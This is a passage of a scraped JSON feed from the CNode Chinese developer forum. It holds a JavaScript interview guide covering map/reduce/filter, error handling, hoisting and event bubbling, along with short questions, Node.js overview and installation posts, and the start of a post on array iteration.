class=\"prettyprint language-javascript\"><code>&quot;2345-678r9&quot;.match(&#x2F;[a-z A-Z]&#x2F;); &#x2F;&#x2F; returns [&quot;r&quot;, index: 8, input: &quot;2345-678r9&quot;]\n&quot;2345-678r9&quot;.replace(&#x2F;[a-z A-Z]&#x2F;, &quot;&quot;); &#x2F;&#x2F; returns 2345-6789\n</code></pre><p>Regex 是一个重要的主题，开发人员应该理解它，以便轻松解决复杂的问题。</p>\n<h3>9）理解 map、reduce 和 filter</h3>\n<p>函数式编程是当今的一个热门讨论话题。许多编程语言都在新版本中包含了函数概念，比如 lambdas(例如:Java &gt;7)。在 JavaScrip t中，函数式编程结构的支持已经存在很长时间了。我们需要深入学习三个主要函数。数学函数接受一些输入和返回输出。纯函数都是给定的输入返回相同的输出。我们现在讨论的函数也满足纯度。</p>\n<h4>map</h4>\n<p>map 函数在 JavaScript 数组中可用,使用这个函数，我们可以通过对数组中的每个元素应用一个转换函数来获得一个新的数组。<strong>map</strong> 一般语法是:</p>\n<pre class=\"prettyprint language-javascript\"><code>arr.map((elem){\n    process(elem)\n    return processedValue\n}) &#x2F;&#x2F; returns new array with each element processed\n</code></pre><p>假设，在我们最近使用的串行密钥中输入了一些不需要的字符，需要移除它们。此时可以使用 <strong>map</strong> 来执行相同的操作并获取结果数组，而不是通过迭代和查找来删除字符。</p>\n<pre class=\"prettyprint language-javascript\"><code>var data = [&quot;2345-34r&quot;, &quot;2e345-211&quot;, &quot;543-67i4&quot;, &quot;346-598&quot;];\nvar re = &#x2F;[a-z A-Z]&#x2F;;\nvar cleanedData = data.map((elem) =&gt; {return elem.replace(re, &quot;&quot;)});\nconsole.log(cleanedData); &#x2F;&#x2F; [&quot;2345-34&quot;, &quot;2345-211&quot;, &quot;543-674&quot;, &quot;346-598&quot;]\n</code></pre><p><strong>map</strong> 接受一个作为参数的函数， 此函数接受一个来自数组的参数。我们需要返回一个处理过的元素， 并应用于数组中的所有元素。</p>\n<h4>reduce</h4>\n<p><strong>reduce</strong> 函数将一个给定的列表整理成一个最终的结果。通过迭代数组执行相同的操作， 并保存中间结果到一个变量中。这里是一个更简洁的方式进行处理。js 的 <strong>reduce</strong> 一般使用语法如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>arr.reduce((accumulator,\n           currentValue,\n           currentIndex) =&gt; {\n           process(accumulator, currentValue)\n           return intermediateValue&#x2F;finalValue\n}, initialAccumulatorValue) &#x2F;&#x2F; returns reduced value\n</code></pre><p><strong>accumulator</strong> 存储中间值和最终值。<strong>currentIndex</strong>、<strong>currentValue</strong>分别是数组中元素的 index 和 value。<strong>initialAccumulatorValue</strong> 是 <strong>accumulator</strong> 初始值。</p>\n<p><strong>reduce</strong> 的一个实际应用是将一个数组扁平化， 将内部数组转化为单个数组， 如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [[1, 2], [3, 4], [5, 6]];\nvar flattenedArray = [1, 2, 3, 4, 5, 6];\n</code></pre><p>我们可以通过正常的迭代来实现这一点，但是使用 <strong>reduce</strong>，代码会更加简洁。</p>\n<pre class=\"prettyprint language-javascript\"><code>var flattenedArray = arr.reduce((accumulator, currentValue) =&gt; {\n    return accumulator.concat(currentValue);\n}, []); &#x2F;&#x2F; returns [1, 2, 3, 4, 5, 6]\n</code></pre><h4><strong>filter</strong></h4>\n<p><strong>filter</strong> 与 <strong>map</strong> 更为接近， 对数组的每个元素进行操作并返回另外一个数组（不同于 <strong>reduce</strong> 返回的值）。过滤后的数组可能比原数组长度更短，因为通过过滤条件，排除了一些我们不需要的。</p>\n<p><strong>filter</strong> 语法如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>arr.filter((elem) =&gt; {\n   return true&#x2F;false\n})\n</code></pre><p><strong>elem</strong> 是数组中的元素， 通过 <code>true/false</code> 表示过滤元素保存/排除。假设， 我们过滤出以 <code>t</code> 开始以 <code>r</code> 结束的元素：</p>\n<pre class=\"prettyprint language-javascript\"><code>var words = [&quot;tiger&quot;, &quot;toast&quot;, &quot;boat&quot;, &quot;tumor&quot;, &quot;track&quot;, &quot;bridge&quot;]\nvar newData = words.filter((str) =&gt; {\n    return str.startsWith(&#x27;t&#x27;) &amp;&amp; str.endsWith(&#x27;r&#x27;);\n})\nnewData &#x2F;&#x2F; (2) [&quot;tiger&quot;, &quot;tumor&quot;]\n</code></pre><p>当有人问起JavaScript的函数编程方面时，这三个函数应该信手拈来。 如你所见，原始数组在所有三种情况下都没有改变，这证明了这些函数的纯度。</p>\n<h2>10) 理解错误处理模式</h2>\n<p>这是许多开发人员最不关心的 JavaScript。 我看到很少有开发人员谈论错误处理， 一个好的开发方法总是谨慎地将 JS 代码封装装在 <code>try/catch</code> 块周围。</p>\n<p>在 JavaScript中，只要我们随意编写代码，就可能会失败，如果所示:</p>\n<pre class=\"prettyprint language-javascirpt\"><code>$(&quot;button&quot;).click(function(){\n    $.ajax({url: &quot;user.json&quot;, success: function(result){\n        updateUI(result[&quot;posts&quot;]);\n    }});\n});\n</code></pre><p>这里，我们陷入了一个陷阱，我们说 <strong>result</strong> 总是 JSON 对象。但有时服务器会崩溃，返回的是 <strong>null</strong> 而不是 <strong>result</strong>。在这种情况下，<code>null[&quot;posts&quot;]</code> 将抛出一个错误。正确的处理方式可能是这样的：</p>\n<pre class=\"prettyprint language-javascript\"><code>$(&quot;button&quot;).click(function(){\n    $.ajax({url: &quot;user.json&quot;, success: function(result){\n    \n      try {     \n        updateUI(result[&quot;posts&quot;]);\n       }\n      catch(e) {\n        &#x2F;&#x2F; Custom functions\n        logError();\n        flashInfoMessage();      \n      }\n    }});\n});\n</code></pre><p><strong>logError</strong> 函数用于向服务器报告错误。<strong>flashInfoMessage</strong> 是显示用户友好的消息，如“当前不可用的服务”等。</p>\n<p>Nicholas 说，当你觉得有什么意想不到的事情将要发生时，手动抛出错误。区分致命错误和非致命错误。以上错误与后端服务器宕机有关，这是致命的。在那里，应该通知客户由于某种原因服务中断了。</p>\n<p>在某些情况下，这可能不是致命的，但最好通知服务器。为了创建这样的代码，首先抛出一个错误，， 从 <strong>window</strong> 层级捕捉错误事件，然后调用API将该消息记录到服务器。</p>\n<pre class=\"prettyprint language-javascript\"><code>reportErrorToServer = function (error) {\n  $.ajax({type: &quot;POST&quot;, \n          url: &quot;http:&#x2F;&#x2F;api.xyz.com&#x2F;report&quot;,\n          data: error,\n          success: function (result) {}\n  });\n}\n&#x2F;&#x2F; Window error event\nwindow.addEventListener(&#x27;error&#x27;, function (e) {\n  reportErrorToServer({message: e.message})\n})}\nfunction mainLogic() {\n  &#x2F;&#x2F; Somewhere you feel like fishy\n  throw new Error(&quot;user feeds are having fewer fields than expected...&quot;);\n}\n</code></pre><p>这段代码主要做三件事:</p>\n<ul>\n<li>监听window层级错误</li>\n<li>无论何时发生错误，都要调用 API</li>\n<li>在服务器中记录</li>\n</ul>\n<p>你也可以使用新的 <strong>Boolean</strong> 函数（es5，es6）在程序之前监测变量的有效性并且不为null、undefined</p>\n<pre class=\"prettyprint language-javascript\"><code>if (Boolean(someVariable)) {\n&#x2F;&#x2F; use variable now\n} else {\n    throw new Error(&quot;Custom message&quot;)\n}\n</code></pre><p>始终考虑错误处理是你自己， 而不是浏览器。</p>\n<h3>其他(提升机制和事件冒泡)</h3>\n<p>以上所有概念都是 JavaScript 开发人员的需要知道基本概念。有一些内部细节需要知道，这些对你会有很在帮助。 这些是JavaScript引擎在浏览器中的工作方式，什么是提升机制和事件冒泡？</p>\n<h4><strong>提升机制</strong></h4>\n<p>变量提升是 在代码执行过程中将声明的变量的作用域提升到全局作用哉中的一个过程，如：</p>\n<pre class=\"prettyprint language-javascript\"><code>doSomething(foo); &#x2F;&#x2F; used before\nvar foo; &#x2F;&#x2F; declared later\n</code></pre><p>当在 <strong>Python</strong> 这样的脚本语言中执行上述操作时，它会抛出一个错误，因为需要先定义然后才能使用它。尽管 JS 是一种脚本语言，但它有一种提升机制，在这种机制中，JavaScript VM 在运行程序时做两件事:</p>\n<ul>\n<li>首先扫描程序，收集所有的变量和函数声明，并为其分配内存空间</li>\n<li>通过填充分配的变量来执行程序， 没有分配则填充 <code>undefined</code></li>\n</ul>\n<p>在上面的代码片段中，<code>console.log</code> 打印 <code>“undefined”</code>。 这是因为在第一次传递变量 <strong>foo</strong> 被收集。 JS 虚拟机 查找为变量 <strong>foo</strong> 定义的任何值。 这种提升可能导致许多JavaScript 在某些地方抛出错误，和另外地方使用 <code>undefined</code> 。</p>\n<p>学习一些 <a href=\"https://developer.mozilla.org/en-US/docs/Glossary/Hoisting\">例子</a> 来搞清楚提升。</p>\n<h4><strong>事件冒泡</strong></h4>\n<p>现在事件开始冒泡了! 根据高级软件工程师 Arun P的说法:</p>\n<blockquote>\n<p>“当事件发生在另一个元素内的元素中时，事件冒泡和捕获是 HTML DOM API 中事件传播的两种方式，并且这两个元素都已为该事件注册了处理程序，事件传播模式确定元素接收事件的顺序。“</p>\n</blockquote>\n<p>通过冒泡，事件首先由最内部的元素捕获和处理，然后传播到外部元素。对于捕获，过程是相反的。我们通常使用<strong>addEventListener</strong> 函数将事件附加到处理程序。</p>\n<pre class=\"prettyprint language-javascript\"><code>addEventListener(&quot;click&quot;, handler, useCapture=false)\n</code></pre><p><strong>useCapture</strong> 是第三个参数的关键词， 默认为 <code>false</code>。因此， 冒泡模式是事件由底部向上传递。 反之， 这是捕获模式。</p>\n<p><strong>冒泡模式：</strong></p>\n<pre class=\"prettyprint language-html\"><code>&lt;div onClick=&quot;divHandler()&quot;&gt;\n    &lt;ul onClick=&quot;ulHandler&quot;&gt;\n        &lt;li id=&quot;foo&quot;&gt;&lt;&#x2F;li&gt;\n    &lt;&#x2F;ul&gt;\n&lt;&#x2F;div&gt;\n&lt;script&gt;\nfunction handler() {\n &#x2F;&#x2F; do something here\n}\nfunction divHandler(){}\nfunction ulHandler(){}\ndocument.getElementById(&quot;foo&quot;).addEventListener(&quot;click&quot;, handler)\n&lt;&#x2F;script&gt;\n</code></pre><p>点击li元素， 事件顺序：</p>\n<p>handler() =&gt; ulHandler() =&gt; divHandler()</p>\n<p><img src=\"https://image.fundebug.com/2019-02-21-001.png\" alt></p>\n<p>在图中，处理程序按顺序向外触发。类似地，捕获模型试图将事件从父元素向内触发到单击的元素。现在更改上面代码中的这一行。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.getElementById(&quot;foo&quot;).addEventListener(&quot;click&quot;, handler, true)\n</code></pre><p>事件顺序：</p>\n<pre class=\"prettyprint language-javascript\"><code>divHandler =&gt; ulHandler() =&gt; handler()\n</code></pre><p><img src=\"https://image.fundebug.com/2019-02-21-002.png\" alt></p>\n<p>你应该正确地理解事件冒泡(无论方向是指向父节点还是子节点)，以实现用户界面(UI)，以避免任何不需要的行为。</p>\n<p>这些是 JavaScript中的基本概念。正如我最初提到的，除了工作经验和知识之外，准备有助理于你通过 JavaScript 面试。始终保持学习。留意最新的发展(第六章)。深入了解JavaScript的各个方面，如 V6 引擎、测试等。最后，没有掌握数据结构和算法的面试是不成功的。<a href=\"https://github.com/trekhleb\">Oleksii Trekhleb</a> 策划了一个很棒的 git repo，它包含了所有使用 JS 代码的面试准备算法。</p>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。自从2016年双十一正式上线，Fundebug累计处理了10亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家<a href=\"https://www.fundebug.com/team/create\">免费试用</a>！</p>\n</div>","title":"JavaScript面试的完美指南(开发者视角)","last_reply_at":"2019-03-01T10:07:33.461Z","good":false,"top":false,"reply_count":5,"visit_count":1384,"create_at":"2019-02-21T03:38:16.900Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c78e6b40d249a149624f332","author_id":"594474125ee4f56e642e8787","tab":"ask","content":"<div class=\"markdown-text\"><p><strong>关于七牛koa获得uploadtoken过期后怎么重新让其有效</strong></p>\n</div>","title":"关于七牛koa获得uploadtoken过期后怎么重新让其有效","last_reply_at":"2019-03-01T08:34:55.084Z","good":false,"top":false,"reply_count":1,"visit_count":365,"create_at":"2019-03-01T08:00:52.963Z","author":{"loginname":"liuoulin","avatar_url":"https://avatars2.githubusercontent.com/u/22694461?v=4&s=120"}},{"id":"5c766fb8a667ed6d807b9ce4","author_id":"554ab49c852845e37ac8b24a","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/Fm5sHgMD_w6xJ0-znEQDgn7sqlVY\" alt=\"image.png\"></p>\n<p>源码中support/support.js的作用是什么,\n还有ep.all(‘user’, ‘user2’, ‘admin’, function (user, user2, admin) {}, 这个方法的作用是什么, 不知道何时会调用,\n谢谢各位解惑。</p>\n</div>","title":"阅读cnode源码有段代码不知道作用是啥","last_reply_at":"2019-03-01T07:56:13.006Z","good":false,"top":false,"reply_count":5,"visit_count":668,"create_at":"2019-02-27T11:08:40.102Z","author":{"loginname":"yinhaixiang","avatar_url":"https://avatars.githubusercontent.com/u/10047441?v=3&s=120"}},{"id":"5c741184a667ed6d807b9011","author_id":"5a1622ecfa68dfbc62addf53","tab":"ask","content":"<div class=\"markdown-text\"><p>我看egg官网事务实例， mysql有一个beginTransactionScope属性，都是用conn去操作insert和update， 那如果是调用其他service函数， 事务应该怎么写？</p>\n</div>","title":"一个service函数里调用其他多个service， 怎么用事务？","last_reply_at":"2019-03-01T07:15:30.526Z","good":false,"top":false,"reply_count":3,"visit_count":670,"create_at":"2019-02-25T16:02:12.487Z","author":{"loginname":"ZongDuCha","avatar_url":"https://avatars3.githubusercontent.com/u/30211663?v=4&s=120"}},{"id":"5c778597a667ed6d807ba0c8","author_id":"5ab852d6320bb09d69e231f1","tab":"ask","content":"<div class=\"markdown-text\"><p>比如我有A,B,C,D,E,F,G总共7个链接,普通用户只可以访问A,管理员可以访问全部…在数据库设计中,有一张角色表,内容一个是user 一个是admin,我的问题是这个user角色对应的资源是存A好,还是存BCDEFG好…如果存A,那么就是user角色不能访问的链接,如果存BCDEFG就是用户可以访问的链接…这2种方式在权限认证的时候还是有区别的…如果存A,就判断(url == A) return fasle  (循环一次), 如果存BCDEFG,就判断   (url == [ABCDEFG]) return true(最少循环一次,最多循环数组长度),正常好像都存BCDEFG,我感觉是不是存A好一点?是不是有我没想到的问题?</p>\n</div>","title":"关于权限设计...........","last_reply_at":"2019-03-01T06:57:16.247Z","good":false,"top":false,"reply_count":4,"visit_count":698,"create_at":"2019-02-28T06:54:15.569Z","author":{"loginname":"iori2882","avatar_url":"https://avatars3.githubusercontent.com/u/1480587?v=4&s=120"}},{"id":"5c77a3383cc9c540b2641bd6","author_id":"5c77a18ea667ed6d807ba229","tab":"share","content":"<div class=\"markdown-text\"><p>Node.js官网：<a href=\"https://nodejs.org/en/\">https://nodejs.org/en/</a></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/1693315b3ace2bb5?w=554&amp;h=431&amp;f=png&amp;s=85879\" alt></p>\n<p>用户进入官网，会自动推荐适合于开发者电脑的Node.js版本，官网提示我下载适用于windows(x64)的版本。官网有两个版本LTS（长期稳定）版和Current（尝鲜）版。</p>\n<p>官网提供了Node.js的介绍和文档，下载和往期版本。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331603e89e624?w=554&amp;h=364&amp;f=png&amp;s=66606\" alt></p>\n<h1>Windows平台安装</h1>\n<p>下载windows 64版本</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/1693316875efaa8e?w=553&amp;h=269&amp;f=png&amp;s=47447\" alt>\n如果不喜欢目录太深，可以直接修改安装的目录。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/1693316c887db160?w=554&amp;h=216&amp;f=png&amp;s=26751\" alt></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/1693316ef176d332?w=428&amp;h=333&amp;f=png&amp;s=53393\" alt></p>\n<p>安装内容分为4个部分</p>\n<ul>\n<li>\n<p>Node.js runtime➡Node.js运行环境（Node.js命令行工具）</p>\n</li>\n<li>\n<p>Npm package manager➡Npm（Node.js包管理工具）</p>\n</li>\n<li>\n<p>Online documentation shortcuts➡联机文档的快捷方式</p>\n</li>\n<li>\n<p>Add to PATH➡将Node.js安装目录地址添加到系统PATH环境变量中去</p>\n</li>\n</ul>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/16933198d559b4e8?w=388&amp;h=409&amp;f=png&amp;s=83758\" alt></p>\n<p>安装包安装完成，会自动将Node.js执行文件路径添加到系统环境变量中去。那么我们可以在系统任意目录都能使用node指令启动Node.js执行程序。</p>\n<h2>如何检验安装成功</h2>\n<p>打开命令行工具</p>\n<ul>\n<li>输入node -v查看node.js版本</li>\n</ul>\n<ul>\n<li>输入npm -v 查看npm版本</li>\n</ul>\n<ul>\n<li>如果都没有报错，说明Node.js安装成功</li>\n</ul>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331a8dafcfe4f?w=411&amp;h=158&amp;f=png&amp;s=11044\" alt></p>\n<h1>Linux平台安装</h1>\n<h2>连接到服务器</h2>\n<h3>连接工具：xshell</h3>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331b46313dc26?w=540&amp;h=514&amp;f=png&amp;s=75288\" alt></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331b6397c9565?w=545&amp;h=473&amp;f=png&amp;s=72719\" alt></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331b9ec4b6f72?w=576&amp;h=500&amp;f=png&amp;s=36385\" alt></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331bc575d9463?w=558&amp;h=532&amp;f=png&amp;s=103733\" alt></p>\n<h2>环境安装</h2>\n<h3>安装wget下载工具</h3>\n<p>yum是一个包管理工具，它主要的功能是下载/删除/更新RPM包，我的linux环境使用的是CentOS，默认安装了yum包管理工具,不需要单独安装，直接使用即可。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331c64fb0e53b?w=525&amp;h=339&amp;f=png&amp;s=27089\" alt></p>\n<h3>下载nodejs</h3>\n<p><strong>下载地址：<a href=\"https://nodejs.org/en/download/\">https://nodejs.org/en/download/</a></strong></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331ce137c1220?w=608&amp;h=373&amp;f=png&amp;s=67129\" alt></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331cfd2df9a33?w=392&amp;h=197&amp;f=png&amp;s=20170\" alt></p>\n<h3>使用wget安装nodejs</h3>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331d68f801e67?w=553&amp;h=192&amp;f=png&amp;s=75417\" alt>\n下载好的nodejs包是一种xz和tar格式的压缩包</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331d9d49a20de?w=536&amp;h=97&amp;f=png&amp;s=11561\" alt></p>\n<p>ll（ls是ll的简要版）命令是现在当前文件夹下文件，ll -a是显示当前文件夹下隐藏文件</p>\n<h3>xz解压node-v8.11.1-linux-x64.tar.xz</h3>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331dffaf29115?w=497&amp;h=38&amp;f=png&amp;s=4227\" alt></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331e161d93267?w=512&amp;h=80&amp;f=png&amp;s=9695\" alt></p>\n<h3>tar解压node-v8.11.1-linux-x64.tar</h3>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331ea5b342fff?w=500&amp;h=21&amp;f=png&amp;s=3115\" alt></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331ec0f5fcd0a?w=550&amp;h=96&amp;f=png&amp;s=16605\" alt>\nll查看文件目录</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331eeafea68fc?w=420&amp;h=169&amp;f=png&amp;s=16992\" alt>\n安装包内的目录结构符合linux的根目录目录结构</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331f19782b9fe?w=442&amp;h=300&amp;f=png&amp;s=30943\" alt></p>\n<p>如果将nodejs的目录文件移动到linux根目录文件夹下，我们就可以在全局使用nodejs-cli</p>\n<h3>移动安装包</h3>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169331f9360edf88?w=471&amp;h=502&amp;f=png&amp;s=56468\" alt>\n移动目录文件前必须先进入到文件夹内</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169332909b47faa4?w=625&amp;h=93&amp;f=png&amp;s=15300\" alt></p>\n<h3>移动bin目录</h3>\n<h4>移动node</h4>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/1693329962473a39?w=409&amp;h=50&amp;f=png&amp;s=4951\" alt></p>\n<h4>移动npm与npx</h4>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/1693329db598ce25?w=377&amp;h=37&amp;f=png&amp;s=3467\" alt></p>\n<p>现在如果运行npm会无效，npm依赖于lib文件夹，所以移动npm前需要先将lib文件夹移动到系统lib文件夹</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169332a26ad4c7f7?w=449&amp;h=47&amp;f=png&amp;s=5838\" alt></p>\n<p>运行npm -v能够输出npm的版本号，代表安装成功</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169332a64021c711?w=328&amp;h=31&amp;f=png&amp;s=2811\" alt></p>\n<h3>安装nrm</h3>\n<p>nrm是一个npm源管理器，允许我们能够快速的在npm源间切换，我们需要安装nrm来进行npm源的切换。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169332b1e8bcb297?w=576&amp;h=90&amp;f=png&amp;s=29897\" alt></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169332b3b1c93434?w=344&amp;h=149&amp;f=png&amp;s=11407\" alt></p>\n<h3>将npm切换到taobao镜像</h3>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/169332b884983bac?w=464&amp;h=78&amp;f=png&amp;s=5228\" alt></p>\n</div>","title":"Node.js知识梳理之Node.js安装","last_reply_at":"2019-03-01T01:47:24.662Z","good":false,"top":false,"reply_count":3,"visit_count":474,"create_at":"2019-02-28T09:00:40.051Z","author":{"loginname":"zhaodongming","avatar_url":"https://avatars0.githubusercontent.com/u/29243732?v=4&s=120"}},{"id":"5b52cc67fb9e84ec69cc1ca3","author_id":"5b52cbf1fb9e84ec69cc1ca2","tab":"ask","content":"<div class=\"markdown-text\"><p>哪里有Nodejs入门教程-对我菜鸟来说有视频最好谢谢大家。老铁们帮帮忙推荐推荐。</p>\n</div>","title":"哪里有Nodejs入门教程-对我菜鸟来说有视频最好谢谢大家","last_reply_at":"2019-03-01T01:28:35.062Z","good":false,"top":false,"reply_count":50,"visit_count":5923,"create_at":"2018-07-21T06:02:15.043Z","author":{"loginname":"nodeper","avatar_url":"https://avatars2.githubusercontent.com/u/41500847?v=4&s=120"}},{"id":"5c77a2d8ab86b86ddf6b3d07","author_id":"5c77a18ea667ed6d807ba229","tab":"share","content":"<div class=\"markdown-text\"><h1>什么是Node.js</h1>\n<p>Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/1693310ded4bea85?w=468&amp;h=347&amp;f=png&amp;s=60969\" alt></p>\n<p>注意：Node.js不是一门新的语言也不是语言，他是使用C和C++编写的基于V8引擎的JS运行环境，并在ECMAScript基础上提供了一系列扩展对象，比如：fs，event。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/2/28/1693311e486dcd6a?w=489&amp;h=239&amp;f=png&amp;s=15579\" alt></p>\n<p>Node.js语法基于ECMAScript（Javascript是由ECMAScript+DOM+BOM组成，所以Node.js中不具备DOM与BOM的API），他与我们接触到的传统客户端Javascript不同，Node.js不需要浏览器宿主环境，他可以独立的运行在服务器端，并且编写服务器端应用程序，与他对应的语言是服务器端的JSP、PHP、<a href=\"http://ASP.NET\">ASP.NET</a>。</p>\n<h1>学习的Node.js前提条件</h1>\n<p>1、Node.js是基于ECMAScript，所以在学习Node.js前必须能够使用客户端Javascript，或者了解Javascript基本语法。必须熟悉Javascript中的核心概念：闭包、函数、对象、原型与原型链等。</p>\n<p>2、熟悉ES6及ES6+中经常使用的的新语法，Node.js运行在服务器端，所以不存在客户端的兼容问题，Node.js最新版本几乎已经支持所有ES新标准。\n比如：由于Node.js的异步I/O特性，需要大量的回调函数，这也就造成了传说中传统客户端开发中想象不到的地狱回调，ES6中由Promise到Async就是他的最终解决方案。学会ES6会使你Node.js开发插上起飞的翅膀。</p>\n<p>3、加分项：学习过JSP、PHP、ASP.NET等后端服务器语言，学习Node.js会更加游刃有余。如果没有学过也没关系，Node.js和其他语言也有一定差别，稍加学习也能快速掌握。</p>\n<h1>Node.js的特性</h1>\n<p>1、单线程\nNode.js是单线程，Node.js之父ryan dahl为了极致的性能，避免过度设计，自己在编写Nginx模块时Nginx的异步引起了他的思考。当时Chrome的V8引擎出世加上Javascript的语言特性刚好满足了他当时的需求。Node.js因为是单线程所以没有上下文切换所以性能非常高。\n注意：Node.js的底层是由C和C++编写，Node.js虽然是单线程机制，但是执行具体的任务时，底层C/C++程序依旧是在多线程运行。</p>\n<p>2、非阻塞I/O\n无锁机制，不会产生死锁，支持上万个并发连接。因为Node.js是单线程，加入多个任务会面临等待，其中一个任务报错，其他任务会被阻断执行。所以对应单线程的是非阻塞I/O。任务执行过程，进程不会等待任务完成，而是把任务放入事件队列。</p>\n<p>3、事件循环\nNode.js有一个事件环，在执行一个任务时，开始执行到回调结果这段时间，可以执行其他任务，当任务执行完成，会继续执行原任务的回调函数。</p>\n<h1>Node.js能够做什么</h1>\n<p>由于Node.js的特性，他特别擅长开发I/O密集型的网络应用。</p>\n<p>1、命令行工具</p>\n<p>2、单元测试工具</p>\n<p>3、交互式终端程序</p>\n<p>4、客户端Javascript编译工具</p>\n<p>比如Webpack打包工具，React、Vue、Angular是当下前端开发三大开发框架，babel是当前前端开发者必不可少的Javascript编译工具。</p>\n<p>5、GUI界面的本地应用程序</p>\n<p>Electron是基于Chromium和Node.js可以使用HTML、CSS、JS构建桌面应用程序。</p>\n<p>6、Web Socket服务器</p>\n<p>7、TCP/UDP套接字程序</p>\n<p>8、高并发的社交网络应用程序</p>\n<p>淘宝双十一就是用了Node.js进行前端渲染，阿里巴巴、腾讯、去哪儿、美团、PayPal都在使用Node.js开发自己的应用服务，许多大型网站也选用Node.js作为主要后台开发语言。</p>\n<h1>Node.js性能测试</h1>\n<p>Node.js与PHP+Nginx组合性能测试对比：（3000并发连接、持续30秒的压力下）</p>\n<p><strong>输出“hello world”响应：</strong></p>\n<p>PHP每秒响应请求3624，平均每个请求响应时间为0.39秒；</p>\n<p>Node.js每秒响应请求数为7677，平均每个请求响应时间为0.13秒</p>\n<p><strong>执行对MySQL的查询操作：</strong></p>\n<p>PHP每秒响应请求书为1293.平均每个请求响应时间为0.82秒</p>\n<p>Node.js每秒响应请求数位2999，平均请求响应时间为0.33秒</p>\n</div>","title":"Node.js知识梳理之Node.js概述","last_reply_at":"2019-02-28T08:59:04.882Z","good":false,"top":false,"reply_count":0,"visit_count":412,"create_at":"2019-02-28T08:59:04.882Z","author":{"loginname":"zhaodongming","avatar_url":"https://avatars0.githubusercontent.com/u/29243732?v=4&s=120"}},{"id":"5c778f01a667ed6d807ba157","author_id":"5bf3cec8e6481c5709f5d871","tab":"ask","content":"<div class=\"markdown-text\"><p>求教各位大佬推荐一些关于小程序原理相关的文章。谢谢</p>\n</div>","title":"求教各位大佬推荐一些关于小程序原理相关的文章。谢谢","last_reply_at":"2019-02-28T07:34:25.985Z","good":false,"top":false,"reply_count":0,"visit_count":577,"create_at":"2019-02-28T07:34:25.985Z","author":{"loginname":"tzbcf","avatar_url":"https://avatars1.githubusercontent.com/u/25059314?v=4&s=120"}},{"id":"5c778d69ab86b86ddf6b3c17","author_id":"5a0a5c9da57c17282e120654","tab":"share","content":"<div class=\"markdown-text\"><h2>基本语法</h2>\n<p>下面列出了这几个遍历语法规则：</p>\n<pre class=\"prettyprint language-js\"><code>for (let index = 0; index &lt; array.length; index++) {\n    const element = array[index]\n    &#x2F;&#x2F; ...\n}\n\narray.forEach(element =&gt; {\n    &#x2F;&#x2F; ...\n})\n\nfor (const key in array) {\n    &#x2F;&#x2F; ...\n}\n\nfor (const iterator of array) {\n    &#x2F;&#x2F; ...\n}\n</code></pre><h2>分情况讨论这几种写法的不同</h2>\n<h3>非数字的属性</h3>\n<p>在 JavaScript 中所有的数组都是对象，这意味着你可以给数组添加字符串属性：</p>\n<pre class=\"prettyprint language-js\"><code>array = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]\n\narray.test = &#x27;testing&#x27;\nconsole.log(array) &#x2F;&#x2F; [ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, test: &#x27;testing&#x27; ]\n</code></pre><p>如果打印，那么这个 test 也会被打印出来</p>\n<p>在浏览器中，使用 <code>console.table(array)</code> 打印这个数组可以看到，这个对象中 test 为 index，testing 为 value；其他数组项的 index 值均为数字</p>\n<p><img src=\"https://i.loli.net/2019/02/28/5c774ce373b18.png\" alt=\"20190228105221.png\"></p>\n<p>上述提到的几个遍历方法中只有 for-in 循环才能够打印出这个键值对：</p>\n<pre class=\"prettyprint language-js\"><code>for (const key in array) {\n    